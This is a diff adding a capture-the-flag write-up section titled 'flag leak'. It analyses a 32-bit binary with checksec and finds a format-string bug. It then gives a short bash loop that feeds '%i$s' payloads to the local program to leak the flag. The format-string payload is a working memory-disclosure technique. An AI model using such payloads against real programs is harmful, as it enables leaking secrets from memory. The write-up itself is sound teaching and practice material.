@@ -259,3 +259,67 @@ $ python3 soln.py
 
 ![output](./clutteroverflow/output.png "q3-soln-output")
 
+## BONUS 1. flag leak
+
+In this challenge
+
+- Source Code: [vuln.c](./flagleak/vuln.c)
+- Binary: [vuln](./flagleak/vuln)
+
+### My Solution
+
+**Flag:**``
+
+**Steps:**
+- My first step was to analyse the executable file for which I ran the `file` and `checksec` commands
+
+```bash
+$ file vuln
+vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=17bb7adc72aff4022d6a1c451eb9adcf34df2f8c, for GNU/Linux 3.2.0, not stripped
+```
+
+```bash
+$ checksec --file=vuln
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   78 Symbols        No    0               2               vuln
+```
+
+- The analysation reveals that the file:
+    - is not-stripped so maybe we can use this to our help in future steps
+    - is an executable that is not Position Independent 
+    - runs on the 32-bit calling convention
+    - NX is enebled which prevents data of the program being used for execution (it means that certain parts of the program are not executable)
+    - there is No canary found which is good for us as we don't need to worry about bypassing stack canaries 
+    - Partial RELRO is enebled  
+
+- Now I went and analysed the code from `vuln.c`
+    - There is a function being used called `setvbuf` which I didn't know about so I went and checked it's manpages using the following command
+    ```bash
+    $ man 3 setvbuf
+    ```
+    - After all the setup in main, the main function calls the `vuln` function and this function has a potential vulnerability of format strings we could exploit in near future
+    - And I saw a `readflag` function which reads out the flag
+
+- Next I created a `flag.txt`, and made the execution of `vuln` possible
+
+```bash
+$ touch flag.txt
+$ echo "SUCCESS" > flag.txt
+$ chmod +x vuln
+```
+
+- So, our attack vector is the format string which means we can read the positional arguments which lead to a memory leak and potential printing of the flag using a payload such as this `%i$s` where i refers to the i-th positional argument
+
+- Next I wrote a simple bash script to solve this chall and tested it
+
+> _soln.sh_
+```bash
+#!/bin/bash
+for i in {0..64}; do echo "%$i\$s" | ./vuln | grep SUCCESS; done
+```
+
+```bash
+$ bash soln.sh
+SUCCESS
+```
+
